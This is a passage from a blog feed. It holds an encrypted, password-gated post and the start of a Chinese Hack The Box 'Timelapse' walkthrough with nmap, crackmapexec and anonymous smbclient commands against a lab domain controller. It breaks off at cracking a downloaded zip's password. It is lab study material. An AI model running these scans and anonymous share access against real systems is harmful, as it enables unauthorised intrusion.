46372b1d2fa01b3c7cb5e22620b7e80fc42969adf27d6e13f311aca55819fe16d15fe3f104634de913d3fc96c1183b3d07dac018eefb5f3e18c41d9f334ae413cc173eb5ee74e16937cbc97c2817e6fc280d96ec4b3f7a6f743e8fb8af09c87fcf5213b3be57dca27dee46de95d926f7529254de6e7186aa757bc53d59539144c8ab8fdba6e0661f025dca574319d57b53b735f1e000e355208bfc6665096f439f177ca63f2c4b76501bc627d10573c00c4ff0920497aa461c44a606933aa4395c8a79a4e629deb3e111b25f6741378798c9829a563ed6f767211551e4796025a3a19369d63147f9e5c0c6dd31375d6b4909d211d13ac7dc7a7566ded413b813a9b23779f0c259af2787c4dbc79e70cb71d4849f42bc874c826148baf27e1cef96ee8073a6588aa9703bb9a4e4b653bc6b0a71e7a90b95d203ef76e870ef07b08710bae579200b45655ad7c620cc89edf5cefb3e35a3197b04c065b4d295f263a73ccfa94e222ffe1bfef4fddc87cde3e6e08215ee8d2a18eeafd6521f2d6aef5438f9538cdb6dee361f4509be86e6c506c47f699ee050a0272cca6d25fa811478b96d93ececd60830114db596324d97191e27d9cad9f3bc08b718fd7bc4c53f01972fab551a8bcf1783ed309879ba46611f6a1a06946205097897152a23d331be59e111aa00c88047255b615e834a8b007d8a4fba9ea1992fa6501b4b3ec874b5cbf9ea34a2d3ebe4600c69d73386e067aeb53b7eff97a780ada75f2474822737dff80a23feb0e888c29f77061fd3f03d312bcd407d9ca98dc82bbe239857f027560248c3c0755bc85f69b1b0858bd59313569a6d0e0cb80c0257df92f0b6e186e98b8851bbac895bd1ef63175e4f2d495c94112d6215de941cda8d63983f75595ca949a655da3dbf723d40867952cce091ecc26428f27165a60fa3ab20af43de36ef21773fd26f284bffa3a91f18b7c78099ea2eede103c2ba12ddc3d96de747089d5f9a03b1110bba34aac7a21b4a262d883f5b8609a58078e1cbd4a903b6c1548b84f133db4fb5f23d7de2af00eaec6b8a62b13d5aa7df5294b3aa4e711b6a48da04c2f927bc03862c89a030264cbd4ca317111b4bfcf83672fa971625a48a67a4e8d7652bf36045927cd9bbdf28fa2f508ca1f76887de3b11dd689a4c64e6989d9dcb2ab0f2d1e95909de9eec564b2b0730d889896ded890a28ca15c1a86bed2d59c91f66764050817ebee111990967c91f2bfa6b0048e796a96b251621604bd5d59610b6409669ef19919b8c4186ce6437f669428bf036f866fe4f936366235b6dfe0ed8f98a23ee580219fda36ad416e78fbe3953aca237fc6ee0f34e36fe6eb74d480f4afe2e9bea08fbcee8ee7273d0c1cdbbbad19426a161e6a678cda4e77ed1e424b427a5a64a51250b901ae7d16889e11a7edbc49f462784a6959d966ab522fbd963027388ff9aa1861ef6de8ef447f759a2b3f0f585cef399badd748107595323f284ab84e320592648e7a71069ac0f5b53fc31110d7c19f7857b2581e93dab872ae71d6d56259a70c8cb2d39a9552798011a5e94fc8d84ca2857eda100c0939c2b7cb1961de4d6f83a74c85db45046ee80dd900d7b2fe5952951009c9fec1b17680392ed6f802b4f115d142a8534783d4471099d691a2f59db09cfca0d6689f6a4064640a3b477a17a99d366aea8d39731445811c1fafb90b517670e325b2bc1f0cb246043ccfcbd248851f00e32f2c7506564c2a429ef3cf81357b9f642e2a43599d30e2904f9aa773eeb3fc3267547799f0c2ab170147b4be0b6f3c3a1ba306dd7baa3241f151ffaa1d38b49f2b0492d56832241be162e2742bbfe5815234a6bb4bc248e25b3db99f4c43b2fb322131c3bcb33273ebb4aa12938c4b2dfc42f62ef69ef8793a143d348407a08dee51c65823fd9e3633f400142678dddeb74f69384c7783fbe1315e3dd444b91a0ce12a3254d5257b4904a48454ad52b03a59aad10c55a30e8ba0471ac12ed6b28cf0ea92d77b5fcd31d63384bccf46338f516f77be90b62881bf572e26fbf3a875eccb8b265cbc6ecdc4bfd159a1c277d05ae8a1c52ff82ba64a7c80f97973ac1f4b30a87003bb4e2c1a32176a73887a3ba425f506a67c480546ae424a183367a4628b8afac60446db7c8f743a7fd232a5331ab5414ff3112fc91e45ffe39b99a368119ee1a8e9a55eff9823054fc1c77452987dd7d184ff34db65ada47203c09b3f3e0427456d3c1721924792f3e086a3310a099d8f374c5018583a3193584f82420f3e794d1a3a346808e6a031a910a011fa1afe3ddb8490b354ee418add248f222f1071b907ed0b7ca404eb7aa54ec2a79db611c91b20803e6ed20c188042aa618fe247b337899b6ff85dc21251b8282d217e21a4db2e9683878f8ca6b2f540dbec39077b1651f146a95dc6f4c92d2f90c31145718017a253f44069090831248c40f1a8c515103124b4146372fbd73021c9b9b1be2ef14cce716536aa1e2d2ee269657eee6624a8eb18928acf36232d2f753b9b314617d4b32fcc55d1986d6f21e638cea7edebbf5b0bf72eeee85836fcda91585a34b2d441d7463fffefedf2475da3ee04cc5829e1a98d0fe264b368035ef6d77919d4509c06960ca65ad69f673b8229eafa6196449bb128c8487cbf12d67f12dd95e67ec7e798eaac053cadbe163a7362d95f6442559bc35e34740c9090498f6bfb10baf68fee2454d230432366311d6f454ede9e5e4dfebabc7d2d5a3f5bfdca42374fed85a688ca938ffe484601ef4348e0cfbbe36983f4406225de8ac439615d8c1a5fcbed64f47a04385c2c6ab187de36e804989e0256b5ba4e5b852912b1d621c8fdec3b9cfb08c725784da9828de60567490fe425fc50085d1ba1e1a3e11fb1b1b7dce5832d5bebd4b900d4309be436b7ba2a9bee8356ec928e2c1fb3a27daabd17c027f3990fb15facdbdc3351a662a1acb669584e0d6c3aa4ed511bba23298a763fdf3895bbc26222f6a3e08e967bf87dc6d9816caba2bc951de3ab5b122430104213217b75172b90de46bd56c362effa8f9131f920326ceb1c336baf116b928d001ffaddb6c1a969132e959167ef6dbae5a4ba65461a1d8ee8f995deea2565d937c3171c2611aff2c1246ea81bd3854720e965d308c88d4d75a35552292f9b33d543e2da244bbafa7570624dac29882942795a4f30bbed6141f5cd0e0907cc3c37abb46de2a78e72eaef6aab9cfb2d71772b70195520876163d34469a501a3cea169a725b2099a04e15b56307ab064d60190d53e3c656a8a0fd30023fb3b070874ed153cedfe94e2988a3483b4757d2f0c7dda31829d3b6d495e825e723078a0ef8e3d6dae26435a76e5880632463dfd473cb191129526c01979be5da03d6102b8d4e658beee87a136d16bbd757acd78a34aba4f74549530825051d9255c536a5383542fc59f1cfeb4796ff33f05d83b97a9c05af781822be048a2810b6168bcb7ca778c7296324ce3ad6f2595dde40c9910343bdaa28dd825c388833086bcea4d06480413a8a7724407904254aa188ec804a5cee314cccc72cfab036d66de99a8721ea11744f2e7dd355ccc26fab796f7b62a8e8b4fe0b518b09da4b2c03d316bc8f6d23791b2c5e712fbbae0a309566b00c3920d196b690c72994051dfadf16cafa1917cee4caf31d7a3b4fee147524d9ab9c86bd857e9109711b0d45d68fc168b7c134b4d02db2498604d67c832ff22229c6b733c853aa5167501f197ef7e4b832ed79554959ac69b20df0597f34d4b0ccd40c34b7bff035e96fced7cf9f0ad0fafdfa55935810efa9dff3416cf7c2bd16fe12352f8962dcd88a773622e8fb1ab705140d065f048812dcc5a3431199cc09abdcbec663ac815624f7ea7c12f0bd2cf96de6a0fd85353bbc905086093d537b494a4d0920004e9780cc2382455ab4e6540a6efc960447d355703c8665e04046fa2ca3a5e7ea17c4f830fcf7158a8e51aeadf834ff1ef076a8d3effa271ffc1a783ad1c2bc7d996065c94834498e3a22c0d2c592a986c8692285ddbcc612d2a99c62a61fe5d7aabfa4232540c960dedb3621c1830147c5758826a7aa4f811b58a2ede2e575d79ca7323f05fd0396d4c1f0a9a8a550ab2b939bafe6b0b47d33b6da0e60ec3ace88c665d54edf4772c7112fabecc6f393ef8d78044f02b64269ce0c3234a7ff95d089d18ca43390a2674d2b4d6044fddcef2a91e1694e7d889eb571b7fe8c106f202975c8e5eb2391a06c46423f92cc2a01d6b374592a8db3176b1abad4a02a24864d8a5887852b47cdf7eea261fabd4e60b0a92a3fdc9b0edb09a6c39463b0e0e76b989af648abfc96404a987fa1b31edaa8b7d7e30973c26b7f2cc9c18a2bf3867ab7ae1862791a180b5545d8357e57a58e6a1439d839569966173dabee806144f67e9cdb96a36b4008cf3e4edbd13ba7e0401a96de68d2fb52626a04e6c355380281268a6a2041f6c0a62d1cfee587eabe95af708e215d2787efaec0103c9f5138deca4b166b7fd140647bca19ece6d33a4cc735ee5a2be63c6418458e7915d2e04f310ca5e48491deca1795bf5daa7ab0c357a05705114e8bd8162e1441d5e279a91613d966a641de72978318b85f9818bf0cea9194df4f4fee76da035554f955242561823e47c491a4768e9eb71914f61427634a336c39c9c3c636a98b066e40a1a86d407a6b5f498f2e4b696e7cf7a2150932eb9749726877b14a31994aa9d8390524c9760894d68b89b67ae8604ff33038cf2edf20c471feb0beaae47ae97a63842a4907539dca19b661235ec75c8066cbd3a177cdc5c834d0676e0c4b4b95b06afb9a2e6284b03c7b512e8441df140a6c9a3d4d51cdbb9dac026b93b0f191021cbb475efc179d360c2c8ea4cae5fdb77f23f55eb4bb169752a640de5d6fb4f92aa97af990b557258e84ea9c128d0df488f520039279f8d7033d33ba0202dec622201f685b14aadb0fa8ffdc1d053bc67834b309d40ea040a602d819fdfe9d68bca332b56edf189649485e328519f2bee54bfa70374e2992c21b2b5a2bd1fe59069db36fcd89e49b583253614c00e2604c04142a1cd6dfffb7e918fb6d8bf4b6926a551e6cefe00870622746247bf1ece0bba55ddfda3c355924fdcc90643cb7fbd1f9db4a093fbc803821fe628489b8c24141438dbd2d321716ab52baf7cfd0c8995f4163fab6981d1c65d3704670c8bab1718f31eca5902c2f4eee14779791834c2cc1507d4547961837de65e07b2c7d5e847d2f78b919f94a7ebd524bcb7a9b675b3bdfc1610e31d55f60a3ad1f158f336135e80a8fec2e7e36dd87c5e6636b14bfff2ce774c79803dab20a2eefa3c8a61aae7797ca45edb8153e40b7d1f87b1314f2e6e419c71eb0ec4820a0af1459c8bbd282fd5e732ec048c0e635a902d49e083734b38e1acde65c22ea4c920cfee290601d714dabeb05f5e44bb59da4ac87f1ecb92e8ef0ac4147eea8fff161305f7c2affd4d4f57232a50f7b84a05af61c44f50baa94d1e7f9506fcedc4aa8eb87533022752011b6e5fcba07dcdcb70305058e4904d76f259cf01496aba076d1ad0a42776a5528111969b6c3b20bf645e7c5bfe1315c31c4327a5d62b96367ea471d0c50538c8c7a029c7f4e5ac57ad9d8bb36de67cec8d6001dbafb6e3f855d01cba098c315538d24f98d95deb6a0e907b616e80f9310a7a9b556d9d03589e1c0bcf9245f2ca6302ef23744af78024d200849cc1ed5a91805765f787801fa225186b8f569523f71f27476c2b45d0465d5ed113db5f2005107925c76210a16a40aeee5c8e9a6dbdab0fa4a46c86b0c6375154db842d7779cc0baecb2ce7284c44b30df3fdec2c9895af3e2a77dce6a570fa94d055fabab52b4487027f28721f645795aca24f756f96e17871f620767a171027e5cc8dab76331572fbf53f3dea3a25845a3c685245d245cf73a73b02102c153143e4c85fd0728598a8ecccf7805007efcbcb8900627b126c6c6bb597d6aa04dce59daeb4018334d6bc4a1a79c7c584fb61eafb4c0daf8f8311f6abefa54dae06c1d23b729e5603f8916e81c4f7a50021673a020f2f6d6ec1661da43e76fb333c47d3a72d6289d4f2eafdbc84a9bd9aa594d21f2d570f247b28e5e50dceda4e06f2e98aae0e1d17c4e1f2dd5c7609b1da939fb70ca1dc1ac3c63d1ba1081eddf98378c6460b11f91dae597bf390a528f8d409a98ac4a9a07513810367c8edfc7a313248ef954957450595891dbd67f99a37994d040b7555b21937a2d697efb0ce4f3928e6fadac037e27927e6c716d93543eb7d25d0496cd1316f626dd69cac60488b99c07e03f18932a03ac4c2257065f4c678176e8dc040067e1ab23cb5ab8c82508ea8168a665fbde31fe3665e40065dfd6ebad176861769a89c14d6264695b55915f530ce0fd4e46297e5e6e3a43d5f8b52a5cc186d8fb5171682ffe4757f4f8ea1715aef531cc71830901cc0385844181e45a251296dc29c684d345c4804ff4ac720abf512b959b86ef7fb46f9e3768e6ecbfa9398e23336b6be4992b7179bacfc45eb7527cb3ff3c655958953a36968f1a1c6e1c188816ac9f8e7c3c3017486e3a9eabac019a234d36364e48a465ce1c6cbd7ede91892cc0f3a659efcbb8a355cf061bee7888625dd0c80c24cf3ec45d0c2de3982e7586910495020b34f80a1dc6ce31ab053a01d958c0aaf0c717ce93b3333b257f065179fa0bc8df2f2405951e862de322f7d83d023c40a9d90b604b3f91e3a6e5a663a57b9f5fc8b05c8e101683ae09ad3168c4f39371d058a15b096cb70a05cd6f3ee81be8ecc2f4612c2cd28830860d63a2a31a6edb04c39d9b98cefd3003d985ebf45c05854d90f2590c84698df932f0a47fd8c0ad9dd4cb3d24e49ce970aa17b0cffb67c0cf8285eec6bda447b571b4c6040399585585beb9898fadc1ff95049066edd1549f508e81f0653ce6b174923f9637fbbcff7c20b223a13aa940514476627711c6991fd82a7f44351bd31053bd502d2417ac2df2b34f9c8e689d88c05508b46fe53fc25e38807d63b694d305dfada44f62f712f2e7e7edd0e0bab81358818f69207e339953abe3f66f28fcdd4e142b0e68a43baf8f4a7d115f856859ff943cad5a62196a102614421bf513b50fc53071d7c83ccc3497df4f4e15bb45732be13b1d636f76839ac73bfa09871a68843eebd496ded62633d6814385b056c83f599cc24c2d36a20b9cfdc2124ecb2ca4123350de42d87ebf28593fdc4f83f62976d42d09020bbb6c895d77664cf7275ca6ada2178c679de0836945b8120ed8755d74d138adfc6c20e469a4791fee54f5bd539be5bf803df2fb3ed848238cb8d2f899a33b20753e450e512a9c1d5ecdefeff500b25fcd4c42db0bf71b001d2fb87f382da966bf8e63dd5e70c7d714d8974a71d7457b989f2844baa5d68d9ab6354d016d885c87379c20f2335edd3aea7c94e23540ea03f1e775c7f6e2aaa9177031937acf1389d2acd55a36fc4356c0e5d8611de7ef764ca794b571266eeb37aa4eb26638389f3d566597b2bd2ca0e17694c1ab5f99bc80c6be08841e3f89f486e8c4e4fca8ff2422cb3071cbda7faaa5643bd3cc9fd9a0e154041d1eb50e7444e9e91e9c65a91bbfbf91ea62a2f2ca994755ac1ac9cde7fe6d7e172dd93f736a5f013de6742ad549f2e8656b32b2bc2578ed63066a84ba2ae6e104cd09ec459eb11643801b6bd599b6e20a1bff0f958502234de9a25defd2fa687574ff118d1144c783edb97e382748ad3100a03130bf1dbd10a8b89c0c81659ee754050c7918aa99391beadcb1730117842c797b0254ef08d8320ac68de0caa9fe1798afe125c48aa3e9fb448f500632142760b8d6b3f2789d73a45b77e48317d89a197ed6ead0ba47d1caff15673e4c5aa19a2dfd1a1eb9e574ee0ddbb125fc7d6931581fc8c1e2cd1d83b1932de16696fbc1d1b32655bbc2f135c42d5532572597f3ed1808baa46b147a2537c3b0219b42720605533f5479ea013881b5e516bf36982d8e7eb83e41cdbd6e0e0993ead4fd9975c809023a85bf9503adae9a120d3a29cb7879a1c91c85d983c92d7c0a0ae1df0e1d4b4eca9b51e8935fc5534bf27db43cab44997bb0305a9c7d1dfdbf505f09963a39c10db9b048c45227e38d571f06a6748db0c1726e92adb8d41eb94552c53022cd8936da77798978aa0c1431026321862068a2f0d5beef79a8cf25610307c661e38d20441ee807964aa9cfb29024f7be495f02964664ec58093f739427cb0dc99acbb7bb7f7bc22da367f4943e5790f3813a0c8708c6958397a8ba70f127254afff623d3a71ace4f63d7a67a85cf86a9590a8f54a6e67351cb7f67bc05a87dbe05a78cd61d8982ac387c83612112e6a23b796d2c349ba1ecbaf1145daeb47dfee9618e639dd6721df209eb16624db83d3359fdc7c772886267ddb22d7e7f3952a91047123d3ac51004c4efea0e33bc28ac1940281d4de3e7da747ecdd268fa69291b91ccf34a3cdcfc392a79df23064be2585cea10e3db51914b162f5cfae4ca910fdbcd50af7e74d07299704afd281057a746529c7d2029055f33e8976da56a236d5646a91fb5f7937792389e81ed90a58b8eecd37beed9b88f3c825c4ebfb7e1f9a2d5ae836f51186bc7e7d438a93fdb25e87c8821a8636e118436214cb6052322b12631c2a5012b48d998d0fff1ba6e28c1c919359229782940a52a2964752f3e3666cb1216b8743bcc4dafa067cb865c9c008068e1db1758afd6d813f0dbd483fb4ffbc517c3b746efe3979a33294a2bf16bd6187e1d27d6773f68ac37f6159783882cc23e61d0768112ed1e67e1b2b15d1ffee744445e696c5f657c43d57d0cceb769e79f4aeab09221c1508cd2ca058759940e0f9bbd3eeda0eb935fb98969cf88b32b2bcc52363a15f27a00ddf38f8dc6fb43e809f5b39043e8b6c15bdf61d9fdc7d6405c913ac4256a861de105e91a4c350488f8d96897e152e6aa268efb2c8dbf50877c64de4b75016ac0b1a5bd949d5ae0f7fec6126de23c9c5cef2bcc5b2032b6968fb36c9b67b5e5062689a4c8db173a48308c2d6eb102c6d0ae6a7e7a6026c2c43fde6781e0ae3965123819b91ece70e28367d3144c0b14853015433307633d67d1d10d9d9812f6b9968256b8822ece815a545832b7168da61de63a0b02f3e8906d9e409d6892a7a02fe9a3db90679459a99b2117e09aae95ff7dd6e600af45c832abad8e8f1f440da42bbef25fb303b46611a98a772770d01b2f56a16191ed7dd88e345a9ba11dbd8a7e89225f552882d23af89b77d778aa77b83df59490fc77d6430ad09e4a5a8f003270eaab26093c0b98096441a2f2ee29025eb96972c8b9ffb27e5a96cf409aaf23f201f0295b4b14ccb2b3083322673983469d2f779fa0b251bc0cc82fbfcee44b52d75e9511864282e807e0e30d2837a51c7a79720f7dafbaa2debff18c43bf1210d806c749e88cd5a82a7500149cae527a2f8e1f9c86a01c969a8ec876a3feda6d1b00ccb4cec150f6759497ccafe07f892214982f2e3b251f75adcf0a7bb269e9a06dddf679a470c52fccc53b62e1f1a8fe8dfe7fcd3f24edf06c3d636d6a4e55024a5b7d3e79f84167fd02d927048c0f2a18bc6db42118e4c16fa8642344aed5807a41d6b341e0330ca9435744779e7745a85a96a6eb82fab6d36299e2c275502f32bab320e4afeaad824e7fd2699e8e63598b8f02083dc7d1523287f1d742438a10c3a9d74e41c3694c7a87e61225c99251e249650f00573e6656e638dd531af6350f063a8dfc33b84292e08bfc39774bf439f283d07a90365c6eeaac5b19bc7bd4427c19e232f2e06071774d5fdb15bbf51a4046c0dfa94ae37e393d634208a2d830c0a7c834e31628765aad8c330882b2d9608482e4eb2556ff41fcdf234b2dff3d1f870e5d3afb4af8a2780b3f39e5d5d232ebeab67415ae97acf644e23fd07a461bc08360e2855a2cf8d5598125a673506913a66c80648d9238b6c8b46ffb440b126de6b871cfb79dfa03102683f089ceb669d0fec0338374f0832a237b5723ac36aa17fc4882324eb1921b46789fec087d2132fb66b25129c93beb5e7d1f255962f63abec8e93328aa771242b3cfcf6bbc936d39c08780d30c59b96a44621f8cb4a8f2b51b4d9d1496dcc39e28dab31cae33ee22ab5f6723b8106579163e96dcb99d245aa1d1f96092f64d08bede6ada9eec7f586d9cc081edd33b6f79a0b74387d4725c9c06abca9e4998b77704a3359cff8f970f2307edfca9985f64096c1f6117754cbc72eba084547aa4d3e30f9f44a66fa3ff99620d44ab2e3a7896198aba8ad46d0651ae3e8b5ab87e434e9bf7fd9a9d5b412111778679c617353f7381c70e24869825ae814333d6c36e2a11d04bf0f80a7400efc953e9d76e8633182953f91f230a5cc13c5f78de107b4f89e47c1820e695d6239c3d59ebf047b56ecbafec0988c1ae9a79541aae9b12a99e60acab59254dcc5442974f7e1100d437dbe28d19cc34a62216239f9688132e76e228ba4df04d228ae8f46244907fc7a2e40d142f53bd626bea1372eeb4842362656417f2623be86c34706fd8c1dc894359b02dc6a5d2b2401515c10207c253f171a0cbafd9dd85d389d226158e2dd9a9e619c8406bab7eb114d0bfb1190c849c2e9c75e714c859e989825318119cfcbd3b14abd5768831e23d5d45f1d6b83c38d6de566dff0ceaed6373d3a6c5b8e8783d21ed4d9277f7bdddecc00802a0b52822f4281b0a04b2bb215760085e52ce4919a82f7025582c8d82dc1fc875ac7b1b24601da05256242610cf490f630c6e8fa91b5dcd373830ae13a6a3c220ea58fefeb7f80c66089eb4d23c16103c2bf91eb73002af2497ce98c8fd3408a2770e3d91576d42ca717061fcf9926fe5d0268ec02fcaac8b13739d27688b7a6c8f90d83d14f4793c8a0ef195af6bdba3f66727a9ffe7320567ef6205494f8e257e439548bda0394d3a4b1ce770cae42079dd5b478008d15c6a280ac7f1e7def0b4a2f9578acf201a7d9ad99922d0fe0dda9de55341edf739935fe6171bc6e32804667916ff3d2606063db85d665cd8cf2cf0425c4b5cb47c2027ecd38c35005dd1f321e5cd7a17c7c407f8794bcd17f7a83d242f3202d30cf165706d36d50ac74a5c2b368c30065f67a83f55be847f039b6e542b1117eeeecb4c464d8bd5184aa832bee36edfe6ebf7bb32d377958a47c0cc3d39ca3a0d92ce9a4951f516d3bfe31c84fe5376b0e06f57f9870067ff2f85860b0d5accc1dbc5518ce12a71235b657f4d19afb05167290b5ba49c636b87b3e2f8ee25f5e4d03025af32d9459b0916c1714ab46abe26cf09271c6ca0cc29f966eb5699297000511a08737901993da05458b5c44ba71537b3330f1acf605ab26402bf4837f32cf89a1e83fe18ffd66e4be199abb3091e8a23b558610125c857e993fc203997acf9c47061983567486d861b9cb9f0e23ddf64c85c82ed62ab814db0476ec02eef43df10f073cb208eceb514fa0c07c3055f12aaf5045fed3b68b8bff69c0a37355f850b340e0223ec01ec6443a096addfeb7a7798e52c442a36f273f89aa66e84e9984ac5836416ee8dee147b210d3a12ca033c3c21c3423e992d3be172e2418b7adc7d2cb5cd48172d5bc7b60b61b7bb981e1ea28e4a7b8d73981648ba2f9adcde65881bdd23cc2d751a359e32f2a027adea3189ac61beb0b648149e9e6883a5aadb0e8e335351fe822aa00524d9e7dc899c657c48df64a1dba328545b0694f2c991ed374ccb8ae42a562b50e9f84d1f9378880955e8e01bed3a5c219d8a133c6e25b7b918ed739ea8925d80a45cf911186a60b19fef3d0ab82d63700d52f625600a1cbf836e4dacdd611c53c597bfb6d4d81835dcf6244670f5a3a508ecd5e0947e8050f6173b29875db3522237249c12c3c657a8110d433976212c806df9e140dfc23837cb5b7fd8b2f8b711b3060321313946cc85dd9f87a22caf4da0de1857f190d02c9c1d1e77acd7b7901a1f38c0861da837fa3e1c576607b0e584854829129608e5bb432af0706387343463204ec305a4ea2a41d85c957039d7886467e64278444cf70948d5974a6f105c9b69fe5ed79bdc6352d0fd6822d1f1c067d213029667cf749339020c53eac55c64e9dbf8b418ccb1eeada573b15b86f7e8337f9731198baf3da98a13fe31bc41f8ac489275e8caae23d3b9a5707444d6f8396c54f5aa5c5a4114d76edd34a9c336177783570ff0ec2dd1055399ab25ff2a464686465000e9bb41b5b6beee74144b0152f13a9e3b448686937b3b16ec3bea1e6ae067ff603c864f913c3f5964e71a9a25d9ffa1135feacd3a578b6f27d218c7672b96fcda3fd2fafff1146804353a4701c2a73f0ec4b80881b938891c8fa2ed298dc56470c48296a9731bcaedf21bded4474e8605559264eed95552b4d64b863e6a5acc52583a010f1432c69865234444b1f7ce890fb87de84e3db345bc3ec8703270ef268706e01089829ba341c8a1c9e061fd7f1bd745190e4acb48d0d4e87a4f317931b7d820c1de5d2ff4c41ac659ec6c6b5e412d6366e735092141ff11ef271f74d9ad59dda50c7766e9118f411c5b3126827e858eb2678744090641e4a3e7612317b65f9864193be3ba5eaea3b3f0a1ee30478d0a149f51ad139a7f13c7fc4c876956929b4903db55a8e2c43cd8661b4f163bac18d6ccc37118e9d59a3ae9b96e345ff307ab280aab8b64654bd2c0d01d1ebf6efc5a903cce9aa9e7eeee376bc47d929ec909cba55a37b26f52f6e270e26d471335da0ec84cfaf8196d3ea971c0eb13cb0c3787f3c53e18d341353f51e8fe1388a8d8a48b39762f292573830f8c9a745b61c11419eb81a0118473da4f816a601c1986d1c33326cd6c6407a8ef0a4e71fb4b6fcd63eb1e99bf0ba8ccbb5a47bb85851ff0b73f77c6b3c81e2c9f4e6a8657813a21596c702c888c7bbdf2095b47997afa78a332b163e818fba1b23b645fcc745dd80b5e660d97c8c58ed7a637225a2cc7898b11f48ab956a589b6975ec3de8c175ab1ad3f1a7464865235bda705e290c9547d121bbc892c31e5852f1875d515eafecfcd96e953fdfff6318269158c8b271538d2553513aa7964480e405080554b75e2a791c6808b0638744f454d20b976806e58265492f9ca8227267a2a268ce26ba53525ee0d1f2477d5204dd2f35bf3947dcbf86617604839f90305052d2474ef8b3381f38eda368ba0468bd3f38708a0ece39c32025df3c391027157fabf3b962d25d94c7a72e9ba199137cba729492161701003727fede9d242ba57951a4949f0499b389287b835c8e49a1b80bd26c9da7d93987f56cd9571ed75eb7613ea340da755c123b8b5ca2e1c2ad564ee1d611c1dce0b9fe17d5439d1f312ae477d81eba221f90bff594627548da21b9517af74202ff6d270dec32eba6c73b6b863b00f353b8df6ca12dba3400b8754322e8f88ee3ea70390bf9e1853cf3cbeeda87601b193dd70ddb3a96640d4e05411fd9b8b5272282537493d4e5f4769eab6417b545c15a9ea854c124609fd80e23059038f9d31b3484420d02f2885b9317e5117d75bb441d66c876ee100d752676b6a92dfc20ce80135d6968c6eb93bc2fbb9c2f7f482945278b1d90cb6c19b8a49c215a2a11332d65334db3302032cc0a6b23cec05e3f10187eb541602d08686a62c3e538187923cc5cd3f1b6f9ba93ab15325c21535ac43ee27be99c8a8a1dfac46dd779fef6505ba93fa7ad2f1521efaedf2b681a18570fc343979a2e12ce66bbe0a696bf60f25f11cd271d7a8b534b71ffff9c62cd74367accb881ff017f6260f733806dd9906411d9ab6465c2b7244c6a90d6bb9f0a4e4f624092183d9608415be26f17915a903599d6de69e4e56f05d88090cb1450803c5cff98d3bf0e3c4643252ebaf1c6f5a6b3951d7bc789cf8fd25cc3976a6ba391f1da37d7f6e45e3ff48b247b61bfdaacab2ff659406206d8ad5f40ffd25c12e5cfc61ade1a27a9f791cf4d3429956d77b4b7756cd11d66df2b8787eda9a971caf7ac118780f77d38712e3a098a76a9745d5c163086a2613e9da19fc5f3fe9ba498c2c49c1d3d24d3f2eff3818439289548f0cfcae2af9d232c0534ad876c12f765dbe297d7212fca3eb0e68daab21fccbc4651e4c825b92c03ae3e160dfb18d38932dbb1f96e298b06a315609d9ce4aa1240c3ea3e9434351492db93614d66675a2e3e104c9dc561686a077bc86a782da3cd5c47d3ec779cfbd97b1c5fc31c887e5423fdaabab542613ddca163a406860c2106cbd29a187610f6037f44c82b0a592d55f20426f5bbeb2a19914f5760bced7c7434ee441187dbc3a69ec780a16db989158eb007ea7fc83e306fb260c737fd8040a169d79fab33d09b8eaf5bb77605f9f04d34308a1d7a4d26b595d2b0a5bc4fc9dba592803a95b8080a73f9d151ba4fcc3b0efdba46957b482738ee3d232730eb670147728c6d181973dbd0b0714795788d937dc676214d9b707bb8753a053d83a1d3ca6422c2088e8213c7964f71efd0a57c8af7d5cf42e368da313aa423eaedf80162205b1fbb7f5d338d2f06c76e16026dd451ea05250aa2d254c3678a32bdc05dee4d650334cbde70c9901afc421cf61e18c2bf9943cb5d5016adba7f48e2b6bdd5103cede5c1b51469fd359510e72b7453abefef7319b852e948e4e50b03bbb225c1661f7103f107533bb25bd5817aa3f083ebd25235b35e0f21f3ccf4498589c54f978f1ed74327e22ea8a27141de6e796dedf30119515d35d42a9b1f718a614ab7ceb948e093c5a46c2216038a6496e1e5334e339879958654c8121078e8e162e6a24a768ab1f8b0f</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>htb</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>htb Timelapse复盘</title>
    <url>/2024/04/08/htb-Timelapse%E5%A4%8D%E7%9B%98/</url>
    <content><![CDATA[<p>继续记录靶机，学习📑</p>
<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p>官方wp</p>
<p><a class="link"   href="https://developer.aliyun.com/article/1160921" >https://developer.aliyun.com/article/1160921<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://mp.weixin.qq.com/s/W6g0liTaOFJWFAMJGBwr4A" >https://mp.weixin.qq.com/s/W6g0liTaOFJWFAMJGBwr4A<i class="fas fa-external-link-alt"></i></a></p>
<h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap  -p- --min-rate=1000 -T4 -A 10.10.11.152</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/%E6%88%AA%E5%B1%8F2024-04-08%2023.12.54.png" ></p>
<p>开了挺多端口的，可以猜测这台靶机是个域控</p>
<p>用CrackMapExec对smb扫描，看看有什么共享资源</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.152 --shares -u xxx -p &#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240408233932.png" ></p>
<p>有一个shares目录，用smbclient进行读取文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient -N //10.10.11.152/shares</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409000951.png" ></p>
<p>Dev目录下有个压缩包，get到本地</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240409001044.png" ></p>
<h4 id="爆破拿到密钥"><a href="#爆破拿到密钥" class="headerlink" title="爆破拿到密钥"></a>爆破拿到密钥</h4><p>发现需要密码，里面有个.pfx文件</p>
<blockquote>
